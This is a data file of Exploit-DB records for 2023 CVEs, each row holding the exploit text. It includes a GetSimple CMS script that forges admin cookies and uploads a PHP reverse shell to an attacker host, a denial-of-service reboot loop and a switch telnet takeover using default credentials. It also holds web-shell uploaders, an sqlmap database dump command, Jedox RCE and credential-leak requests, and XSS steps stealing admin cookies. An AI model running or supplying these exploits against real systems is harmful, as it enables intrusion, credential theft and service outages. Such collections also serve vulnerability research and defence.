CVE-2022-41544,"{""CVE-2022-41544"": 1}",2023-05-23,GetSimple CMS v3.3.16 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51475,"Exploit Title: GetSimple CMS v3.3.16 - Remote Code Execution (RCE) Data: 18/5/2023 Exploit Author : Youssef Muhammad Vendor: Get-simple Software Link: Version app: 3.3.16 Tested on: linux CVE: CVE-2022-41544 import sys import hashlib import re import requests from xml.etree import ElementTree from threading import Thread import telnetlib purple = ""\033[0;35m"" reset = ""\033[0m"" yellow = ""\033[93m"" blue = ""\033[34m"" red = ""\033[0;31m"" def printthebanner(): print(purple + ' CCC V V EEEE 22 000 22 22 4 4 11 5555 4 4 4 4 C V V E 2 2 0 00 2 2 2 2 4 4 111 5 4 4 4 4 C V V EEE - 2 0 0 0 2 2 - 4444 11 555 4444 4444 C V V E 2 00 0 2 2 4 11 5 4 4 CCC V EEEE 2222 000 2222 2222 4 11l1 555 4 4 '+ reset) def getversion(target, path): r = requests.get(f"" <URL> match = re.search(""jquery.getsimple.js\?v=(.*)\"""", r.text) if match: version = match.group(1) if version <= ""3.3.16"": print( red + f""[+] the version {version} is vulnrable to CVE-2022-41544"") else: print (""This is not vulnrable to this CVE"") return version return None def apileak(target, path): r = requests.get(f"" <URL> if r.ok: tree = ElementTree.fromstring(r.content) apikey = tree[0].text print(f""[+] apikey obtained {apikey}"") return apikey return None def setcookies(username, version, apikey): cookiename = hashlib.sha1(f""getsimplecookie{version.replace('.', '')}{apikey}"".encode()).hexdigest() cookievalue = hashlib.sha1(f""{username}{apikey}"".encode()).hexdigest() cookies = f""GSADMINUSERNAME={username};{cookiename}={cookievalue}"" headers = { 'Content-Type':'application/x-www-form-urlencoded', 'Cookie': cookies return headers def getcsrftoken(target, path, headers): r = requests.get(f"" <URL> headers=headers) m = re.search('nonce"" type=""hidden"" value=""(.*)""', r.text) if m: print(""[+] csrf token obtained"") return m.group(1) return None def uploadshell(target, path, headers, nonce, shellcontent): uploadurl = f"" <URL> payload = { 'content': shellcontent, 'editedfile': '../shell.php', 'nonce': nonce, 'submitsave': 1 try: response = requests.post(uploadurl, headers=headers, data=payload) if response.statuscode == 200: print(""[+] Shell uploaded successfully!"") else: print(""(-) Shell upload failed!"") except requests.exceptions.RequestException as e: print(""(-) An error occurred while uploading the shell:"", e) def shelltrigger(target, path): url = f"" <URL> try: response = requests.get(url) if response.statuscode == 200: print(""[+] Webshell trigged successfully!"") else: print(""(-) Failed to visit the page!"") except requests.exceptions.RequestException as e: print(""(-) An error occurred while visiting the page:"", e) def main(): if len(sys.argv) != 5: print(""Usage: python3 CVE-2022-41544.py "") return target = sys.argv[1] path = sys.argv[2] if not path.endswith('/'): path += '/' ip, port = sys.argv[3].split(':') username = sys.argv[4] shellcontent = f"" $sock, 1 => $sock, 2 => $sock), $pipes); version = getversion(target, path) if not version: print(""(-) could not get version"") return apikey = apileak(target, path) if not apikey: print(""(-) could not get apikey"") return headers = setcookies(username, version, apikey) nonce = getcsrftoken(target, path, headers) if not nonce: print(""(-) could not get nonce"") return uploadshell(target, path, headers, nonce, shellcontent) shelltrigger(target, path) if name == 'main': printthe_banner() main()"
CVE-2023-31698,"{""CVE-2023-31698"": 1}",2023-05-23,Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated),https://www.exploit-db.com/exploits/51476,"Exploit Title: Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated) Date: 2023-04-15 Exploit Author: Rahad Chowdhury Vendor Homepage: <URL> Software Link: <URL> Version: 3.14.1 Tested on: Windows 10, PHP 7.4.29, Apache 2.4.53 CVE: CVE-2023-31698 SVG Payload - save this SVG file xss.svg Steps to Reproduce: 1. At first login your admin panel. 2. then go to settings and click the logo section. 3. Now upload xss.svg file so your request data will be POST /bludit/admin/ajax/logo-upload HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Content-Type: multipart/form-data; boundary=-15560729415644048492005010998 Referer: <URL> Cookie: BLUDITREMEMBERUSERNAME=admin; BLUDITREMEMBERTOKEN=139167a80807781336bc7484552bc985; BLUDIT-KEY=tmap19d0m813e8rqfft8rsl74i Content-Length: 651 -15560729415644048492005010998 Content-Disposition: form-data; name=""tokenCSRF"" 626c201693546f472cdfc11bed0938aab8c6e480 -15560729415644048492005010998 Content-Disposition: form-data; name=""inputFile""; filename=""xss.svg"" Content-Type: image/svg+xml -15560729415644048492005010998-- 4. Now open the logo image link that you upload. You will see XSS pop up."
CVE-2023-31699,"{""CVE-2023-31699"": 1}",2023-05-23,ChurchCRM v4.5.4 - Reflected XSS via Image (Authenticated),https://www.exploit-db.com/exploits/51477,"Exploit Title: ChurchCRM v4.5.4 - Reflected XSS via Image (Authenticated) Date: 2023-04-17 Exploit Author: Rahad Chowdhury Vendor Homepage: <URL> Software Link: <URL> Version: 4.5.4 Tested on: Windows 10, PHP 7.4.29, Apache 2.4.53 CVE: CVE-2023-31699 Steps to Reproduce: 1. At first login your admin panel. 2. Then click the ""Admin"" menu and click ""CSV Import '' and you will get the CSV file uploader option. 3. now insert xss payload in jpg file using exiftool or from image properties and then upload the jpg file. 4. you will see XSS pop up."
CVE-2023-25440,"{""CVE-2023-25440"": 1}",2023-05-23,CiviCRM 5.59.alpha1 - Stored XSS (Cross-Site Scripting),https://www.exploit-db.com/exploits/51478,"Exploit Title: CiviCRM 5.59.alpha1 - Stored XSS (Cross-Site Scripting) Date: 2023-02-02 Exploit Author: Andrea Intilangelo Vendor Homepage: <URL> Software Link: <URL> Version: 5.59.alpha1, 5.58.0 (and earlier), 5.57.3 (and earlier) Tested on: Latest Version of Desktop Web Browsers (ATTOW: Firefox 109.0.1, Microsoft Edge 109.0.1518.70) CVE: CVE-2023-25440 Vendor Security Advisory: CIVI-SA-2023-05 Description: A stored cross-site scripting (XSS) vulnerability in CiviCRM 5.59.alpha1 allows attacker to execute arbitrary web scripts or HTML. Injecting persistent javascript code inside the ""Add Contact"" function while creating a contact, in first/second name field, it will be triggered once page gets loaded. Steps to reproduce: - Quick Add contact to CiviCRM, - Insert a payload"
CVE-2023-25439,"{""CVE-2023-25439"": 1}",2023-05-23,FusionInvoice 2023-1.0 - Stored XSS (Cross-Site Scripting),https://www.exploit-db.com/exploits/51480,"Exploit Title: FusionInvoice 2023-1.0 - Stored XSS (Cross-Site Scripting) Date: 2023-05-24 Exploit Author: Andrea Intilangelo Vendor Homepage: <URL> Software Link: <URL> Version: 2023-1.0 Tested on: Latest Version of Desktop Web Browsers (ATTOW: Firefox 113.0.1, Microsoft Edge 113.0.1774.50) CVE: CVE-2023-25439 Description: A stored cross-site scripting (XSS) vulnerability in FusionInvoice 2023-1.0 (from Sqware Pig, LLC) allows attacker to execute arbitrary web scripts or HTML. Injecting persistent javascript code inside the title and/or description while creating a task/expense/project (and possibly others) it will be triggered once page gets loaded. Steps to reproduce: - Click on ""Expenses"", or ""Tasks"" and add (or edit an existing) one, - Insert a payload"
CVE-2022-2591,"{""CVE-2022-2591"": 1}",2023-05-13,FLEX 1080 &lt; 1085 Web 1.6.0 - Denial of Service,https://www.exploit-db.com/exploits/51438,"Exploit Title: FLEX 1080 < 1085 Web 1.6.0 - Denial of Service Date: 2023-05-06 Exploit Author: Mr Empy Vendor Homepage: <URL> Software Link: <URL> Version: 1.6.0 Tested on: Android CVE ID: CVE-2022-2591 #!/usr/bin/env python3 import requests import re import argparse from colorama import Fore import time def main(): def banner(): print(' [FLEX 1080 < 1085 Web 1.6.0 - Denial of Service] def reboot(): r = requests.get(f' <URL> if 'Rebooting' in r.text: pass else: print(f'{Fore.LIGHTREDEX}[-] {Fore.LIGHTWHITEEX}O hardware não é vulnerável') quit() banner() print(f'{Fore.LIGHTBLUEEX}[*] {Fore.LIGHTWHITEEX} Iniciando o ataque') while True: try: reboot() print(f'{Fore.LIGHTGREENEX}[+] {Fore.LIGHTWHITEEX} Hardware derrubado com sucesso!') time.sleep(1) except: print(f'{Fore.LIGHTREDEX}[-] {Fore.LIGHTWHITEEX}O hardware está inativo') pass if name == 'main': parser = argparse.ArgumentParser() parser.addargument('-t','--target', action='store', help='Target', dest='target', required=True) arguments = parser.parseargs() try: main() except KeyError: quit()"
CVE-2023-29809,"{""CVE-2023-29809"": 1}",2023-05-05,Cmaps v8.0 - SQL injection,https://www.exploit-db.com/exploits/51422,"Exploit Title: Cmaps v8.0 - SQL injection - Date: 27.04.2023 - Exploit Author: Lucas Noki (0xPrototype) - Vendor Homepage: <URL> - Software Link: <URL> - Version: 8.0 - Tested on: Mac, Windows, Linux - CVE : CVE-2023-29809 Description: The vulnerability found is an SQL injection. The bookmap parameter is vulnerable. When visiting the page: <URL> we get the normal JSON response. However if a single quote gets appended to the value of the bookmap parameter we get an error message: <CODE> Now if two single quotes get appended we get the normal response without an error. This confirms the opportunity for sql injection. To really prove the SQL injection we append the following payload: '-(selectfrom(select+sleep(2)+from+dual)a)--+ The page will sleep for two seconds. This confirms the SQL injection. Steps to reproduce: 1. Send the following payload to test the vulnerability: <CODE> 2. If the site slept for two seconds run the following sqlmap command to dump the whole database including the ldap credentials. `shell python3 sqlmap.py -u "" <URL> --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump Special thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload. #Request to the server: #Response from the server: Look at the response time."
CVE-2022-47879,"{""CVE-2022-47879"": 1}",2023-05-05,Jedox 2022.4.2 - Code Execution via RPC Interfaces,https://www.exploit-db.com/exploits/51423,"Exploit Title: Jedox 2022.4.2 - Code Execution via RPC Interfaces Date: 28/04/2023 Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL Vendor Homepage: <URL> Version: Jedox 2022.4 (22.4.2) and older CVE : CVE-2022-47879 Introduction A Remote Code Execution (RCE) vulnerability in /be/rpc.php and /be/erpc.php allows remote authenticated users to load arbitrary PHP classes from the rtn directory and to execute its methods. To exploit this vulnerability, the attacker needs knowledge about loadable classes, their methods and arguments. Write-Up See [Docs Syslifters]( <URL> for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) The Studio::getUserCreds function can be used to read the clear text credentials of the currently authenticated user. PATH: /be/rpc.php METHOD: POST BODY: ""Studio"", ""getUserCreds"" 2) Using function conn::test_palo, an outgoing HTTP connection can be initiated from the web server to an attacker controlled server (Specify HOST and PORT) with the authenticated user's credentials. This could leak cleartext credentials to an attacker. PATH: /be/rpc.php METHOD: POST BODY: ""conn"", ""testpalo"", true, null 3) The function `Studio::getExternURI` can be used to generate a URL with embedded username and encrypted password of the currently authenticated user. PATH: /be/rpc.php METHOD: POST BODY: ""Studio"", ""getExternURI"", 0, 0 ""flag"":1 4) List all available database connections via `conn::ls`: PATH: /be/rpc.php METHOD: POST BODY: ""conn"", ""ls"", null, false, true, ""type"", ""active"", ""description"" 5) Retrieve details of individual database connection (specify connection name via CONNECTION) including encrypted credentials using the Java RPC function `com.jedox.etl.mngr.Connection::getGlobalConnection`: PATH: /tc/rpc METHOD: POST BODY: ""com.jedox.etl.mngr.Connections"", ""getGlobalConnection"", 6) Some functions return credentials only in encrypted form. However, they can be decrypted by any user using `common::decrypt` (specify encrypted credentials via ENCRYPTEDCREDS): PATH: /be/rpc.php METHOD: POST BODY: ""common"", ""decrypt"", 7) Using `common::paloGet` it is possible to read arbitrary configuration parameters (specify config param via CONFIG. For example, the password of the SMTP server can be read with it (CONFIG: tasks.smtp.password): PATH: /be/rpc.php METHOD: POST BODY: ""common"", ""paloGet"", null, ""Config"", ""config"", ""config"" ""config"": [ true, true 8) The function palo_mgmt::sess_list can be used to retrieve a list of all active user sessions. The session information includes not only the username but also the user's IP address, information about the browser and other data. PATH: /be/rpc.php METHOD: POST BODY: ""palomgmt"", ""sesslist"", null 9) The function palo_mgmt::lic_users_list returns a list of all users stored in the system: PATH: /be/rpc.php METHOD: POST BODY: ""palomgmt"", ""licusers_list"", ""0"""
CVE-2022-47875,"{""CVE-2022-47875"": 1}",2023-05-05,Jedox 2022.4.2 - Remote Code Execution via Directory Traversal,https://www.exploit-db.com/exploits/51424,"Exploit Title: Jedox 2022.4.2 - Remote Code Execution via Directory Traversal Date: 28/04/2023 Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL Vendor Homepage: <URL> Version: Jedox 2022.4 (22.4.2) and older CVE : CVE-2022-47875 Introduction A Directory Traversal vulnerability in /be/erpc.php allows remote authenticated users to execute arbitrary code. To exploit the vulnerability, the attacker must have the permissions to upload files. Write-Up See [Docs Syslifters]( <URL> for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) This vulnerability can be exploited by first uploading a file using one of the existing file upload mechanisms (e.g. Import in Designer). When uploading a file, the web application returns the file system path in the JSON body of the HTTP response (look for fspath). 2) Upload a PHP file and note the file system path (fspath) 3) Get RCE via Directory Traversal PATH: /be/erpc.php?c=../../../../../fspath/of/uploaded/file/rce.php METHOD: POST"
CVE-2022-47877,"{""CVE-2022-47877"": 1}",2023-05-05,Jedox 2020.2.5 - Stored Cross-Site Scripting in Log-Module,https://www.exploit-db.com/exploits/51425,"Exploit Title: Jedox 2020.2.5 - Stored Cross-Site Scripting in Log-Module Date: 28/04/2023 Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL Vendor Homepage: <URL> Version: Jedox 2020.2 (20.2.5) and older CVE : CVE-2022-47877 Introduction A Stored cross-site scripting vulnerability allows remote authenticated users to inject arbitrary web scripts or HTML in the logs page via the log module. To exploit the vulnerability, the attacker must append an XSS payload to the log message. Write-Up See [Docs Syslifters]( <URL> for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) Store log entry with XSS payload: PATH: /ub/ccmd METHOD: POST BODY: ""log"", ""error"", 2) Trigger XSS payload by opening the Logs page and showing the respective log entry."
CVE-2022-47878,"{""CVE-2022-47878"": 1}",2023-05-05,Jedox 2020.2.5 - Remote Code Execution via Configurable Storage Path,https://www.exploit-db.com/exploits/51426,"Exploit Title: Jedox 2020.2.5 - Remote Code Execution via Configurable Storage Path Date: 28/04/2023 Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL Vendor Homepage: <URL> Version: Jedox 2020.2 (20.2.5) and older CVE : CVE-2022-47878 Introduction Incorrect input validation for the default storage path variable in the settings page allows remote, authenticated users to specify the location as web root directory. Consecutive file uploads can lead to the execution of arbitrary code. To exploit the vulnerability, the attacker sets the default storage path to the web root. Write-Up See [Docs Syslifters]( <URL> for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) In the UI in the application settings page the default storage path can be set to any value. This path could be set as the webroot directory of the webserver e.g. /htdocs/app/docroot/. 2) Then any upload/import function can be used to upload a .php webshell file to the webroot. 3) Execute webshell from the webroot directory to obtain RCE."
CVE-2022-47876,"{""CVE-2022-47876"": 1}",2023-05-05,Jedox 2020.2.5 - Remote Code Execution via Executable Groovy-Scripts,https://www.exploit-db.com/exploits/51427,"Exploit Title: Jedox 2020.2.5 - Remote Code Execution via Executable Groovy-Scripts Date: 28/04/2023 Exploit Author: Syslifters - Christoph Mahrl, Aron Molnar, Patrick Pirker and Michael Wedl Vendor Homepage: <URL> Version: Jedox 2020.2 (20.2.5) and older CVE : CVE-2022-47876 Introduction Jedox Integrator allows remote authenticated users to create Jobs to execute arbitrary code via Groovy-scripts. To exploit the vulnerability, the attacker must be able to create a Groovy-Job in Integrator. Write-Up See [Docs Syslifters]( <URL> for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) A user with appropriate permissions can create Groovy jobs in the Integrator with arbitrary script code. Run the following groovy script to execute whoami. The output of the command can be viewed in the logs: def sout = new StringBuilder(), serr = new StringBuilder() def proc = 'whoami'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(10000) LOG.error(sout.toString()); LOG.error(serr.toString());"
CVE-2022-47874,"{""CVE-2022-47874"": 1}",2023-05-05,Jedox 2020.2.5 - Disclosure of Database Credentials via Improper Access Controls,https://www.exploit-db.com/exploits/51428,"Exploit Title: Jedox 2020.2.5 - Disclosure of Database Credentials via Improper Access Controls Date: 28/04/2023 Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL Vendor Homepage: <URL> Version: Jedox 2020.2 (20.2.5) and older CVE : CVE-2022-47874 Introduction Improper access controls in /tc/rpc allows remote authenticated users to view details of database connections via the class com.jedox.etl.mngr.Connections and the method getGlobalConnection. To exploit the vulnerability, the attacker must know the name of the database connection. Write-Up See [Docs Syslifters]( <URL> for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) List all available database connections via conn::ls (see also: CVE-2022-47879): PATH: /be/rpc.php METHOD: POST BODY: ""conn"", ""ls"", null, false, true, ""type"", ""active"", ""description"" 2) Retrieve details of a database connection (specify connection name via CONNECTION) including encrypted credentials using the Java RPC function com.jedox.etl.mngr.Connection::getGlobalConnection: PATH: /tc/rpc METHOD: POST BODY: ""com.jedox.etl.mngr.Connections"", ""getGlobalConnection"","
CVE-2022-47880,"{""CVE-2022-47880"": 1}",2023-05-05,Jedox 2022.4.2 - Disclosure of Database Credentials via Connection Checks,https://www.exploit-db.com/exploits/51429,"Exploit Title: Jedox 2022.4.2 - Disclosure of Database Credentials via Connection Checks Date: 28/04/2023 Exploit Author: Team Syslifters / Christoph MAHRL, Aron MOLNAR, Patrick PIRKER and Michael WEDL Vendor Homepage: <URL> Version: Jedox 2022.4 (22.4.2) and older CVE : CVE-2022-47880 Introduction An information disclosure vulnerability in /be/rpc.php allows remote authenticated users with the appropriate permissions to modify database connections to disclose the clear text credentials via the test connection function. To exploit the vulnerability, the attacker must set the host of the database connection to a server under his control. Write-Up See [Docs Syslifters]( <URL> for a detailed write-up on how to exploit vulnerability. Proof of Concept 1) The host part of a database connection can be changed in the connections details in the UI. Set the Host to a server that you control. 2) Test the database connection. 3) The webserver initiates a connection to the server that you control. Use wireshark to capture network traffic and to ultimately extract the database credentials."
CVE-2023-2246,"{""CVE-2023-2246"": 1}",2023-05-05,Online Pizza Ordering System v1.0 - Unauthenticated File Upload,https://www.exploit-db.com/exploits/51431,"Exploit Title: Online Pizza Ordering System 1.0 - Unauthenticated File Upload Date: 03/05/2023 Exploit Author: URGAN Vendor Homepage: <URL> Software Link: <URL> Version: v1.0 Tested on: LAMP Fedora Server 27 (Twenty Seven) Apache/2.4.34 (Fedora) 10.2.19-MariaDB PHP 7.1.23 CVE: CVE-2023-2246 #!/usr/bin/env python3 coding: utf-8 import os import requests import argparse from bs4 import BeautifulSoup command line arguments parser = argparse.ArgumentParser() parser.addargument('-u', '--url', type=str, help='URL with <URL> parser.addargument('-p', '--payload', type=str, help='PHP webshell') args = parser.parseargs() if no arguments are passed, ask the user for them if not (args.url and args.payload): args.url = input('Enter URL with <URL> ') args.payload = input('Enter file path PHP webshell: ') URL Variables url = args.url + '/admin/ajax.php?action=savesettings' imgurl = args.url + '/assets/img/' filename = os.path.basename(args.payload) files = [ ('img',(filename,open(args.payload,'rb'),'application/octet-stream')) send a POST request to the server respupl = requests.post(url, files = files) statuscode = respupl.statuscode if statuscode == 200: print('[+] File uploaded') else: print(f'[-] Error {statuscode}: {respupl.text}') raise SystemExit(f'[-] Script stopped due to error {statuscode}.') send a GET request to the server respfind = requests.get(imgurl) Use BeautifulSoup to parse the page's HTML code soup = BeautifulSoup(respfind.text, 'html.parser') get all tags on a page links = soup.findall('a') list to store found files foundfiles = [] we go through all the links and look for the desired file by its name for link in links: fileupl = link.get('href') if fileupl.endswith(filename): uploaded file name print('[+] Uploaded file found:', fileupl) fileurl = imgurl + fileupl get the full URL of your file foundfiles.append(fileurl) add the file to the list of found files if the list is not empty, then display all found files if foundfiles: print('[+] Full URL of your file:') for fileurl in foundfiles: print('[+] ' + fileurl) else: print('[-] File not found')"
CVE-2023-25438,"{""CVE-2023-25438"": 1}",2023-05-02,MilleGPG5 5.9.2 (Gennaio 2023) - Local Privilege Escalation / Incorrect Access Control,https://www.exploit-db.com/exploits/51410,"Exploit Title: MilleGPG5 5.9.2 (Gennaio 2023) - Local Privilege Escalation / Incorrect Access Control Date: 2023-04-28 Exploit Author: Andrea Intilangelo Vendor Homepage: <URL> Software Homepage: <URL> - <URL> Software Link: <URL> Version: 5.9.2 Tested on: Microsoft Windows 10 Enterprise x64 22H2, build 19045.2913 CVE: CVE-2023-25438 MilleGPG / MilleGPG5 also known as ""Governo Clinico 3"" Vendor: Millennium S.r.l. / Dedalus Group - Dedalus Italia S.p.a. / Genomedics S.r.l. Affected/tested version: MilleGPG5 5.9.2 Summary: Mille General Practice Governance (MilleGPG): an interactive tool to address an effective quality of care through the Italian general practice network. MilleGPG is an innovative IT support for the evaluation and optimization of patient care and intervention processes, complete with new features for the management of the COVID-19 vaccine campaign. It is An irreplaceable ""ally"" for the General Practitioner, also offering contextual access to the most authoritative scientific content and CME training. Vuln desc: The application is prone to insecure file/folder permissions on its default installation path, wrongly allowing some files to be modified by unprivileged users, malicious process and/or threat actor. Attacker can exploit the weakness abusing the ""write"" permission of the main application available to all users on the system or network. Details: Any low privileged user can elevate their privileges abusing files/folders that have incorrect permissions, e.g.: C:\Program Files\MilleGPG5\MilleGPG5.exe (main gui application) C:\Program Files\MilleGPG5\plugin\ (GPGCommand.exe, nginx and php files) C:\Program Files\MilleGPG5\k-platform\ (api and webapp files) such as BUILTIN\Users:(I)(OI)(CI)(R,W) and/or FILEGENERICWRITE, FILEWRITEDATA and FILEWRITEEA"
CVE-2023-30350,"{""CVE-2023-30350"": 1}",2023-05-02,FS-S3900-24T4S - Privilege Escalation,https://www.exploit-db.com/exploits/51414,"Exploit Title: FS-S3900-24T4S Privilege Escalation Date: 29/04/2023 Exploit Author: Daniele Linguaglossa & Alberto Bruscino Vendor Homepage: <URL> Software Link: not available Version: latest Tested on: latest CVE : CVE-2023-30350 import sys import telnetlib def exploit(args): print(args) if len(args) != 1: print(f""Usage: {sys.argv[0]} "") sys.exit(1) else: ip = args[0] try: with telnetlib.Telnet(ip, 23) as tn: try: tn.readuntil(b""Username: "") tn.write(b""guest\r\n"") tn.readuntil(b""Password: "") tn.write(b""guest\r\n"") tn.readuntil(b"">"") tn.write(b""enable\r\n"") tn.readuntil(b""Password: "") tn.write(b""super\r\n"") tn.readuntil(b""#"") tn.write(b""configure terminal\r\n"") tn.readuntil(b""(config)#"") tn.write(b""username admin nopassword\r\n"") tn.readuntil(b""(config)#"") print( ""Exploit success, you can now login with username: admin and password: "") tn.close() except KeyboardInterrupt: print(""Exploit failed"") tn.close() except ConnectionRefusedError: print(""Connection refused"") if name == ""main_"": exploit(sys.argv[1:])"
CVE-2023-30330,"{""CVE-2023-30330"": 1}",2023-05-02,SoftExpert (SE) Suite v2.1.3 - Local File Inclusion,https://www.exploit-db.com/exploits/51404,"Exploit Title: SoftExpert (SE) Suite v2.1.3 - Local File Inclusion Date: 27-04-2023 Exploit Author: Felipe Alcantara (Filiplain) Vendor Homepage: <URL> Version: 2.0 < 2.1.3 Tested on: Kali Linux CVE : CVE-2023-30330 SE Suite versions tested: 2.0.15.31, 2.0.15.115 # <URL> # <URL> #!/bin/bash Usage: ./lfi-"
CVE-2023-29983,"{""CVE-2023-29983"": 1}",2023-05-02,Companymaps v8.0 - Stored Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/51417,"Exploit Title: Companymaps V8.0 - Stored Cross Site Scripting (XSS) Date: 27.04.2023 Exploit Author: Lucas Noki (0xPrototype) Vendor Homepage: <URL> Software Link: <URL> Version: 8.0 Tested on: Mac, Windows, Linux CVE : CVE-2023-29983 Steps to reproduce: 1. Clone the repository and install the application 2. Send a maliciously crafted payload via the ""token"" parameter to the following endpoint: /rest/update/?token= 3. The payload used is: 4. Simply visiting the complete URL: <URL> is enough. 5. Login into the admin panel and go to the auditlog under: /admin/index.php?tab=auditlog 6. Check your collaborator server. You should have a request where the admins cookie is the value of the c parameter In a real world case you would need to wait for the admin to log into the application and open the auditlog tab. Special thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload."
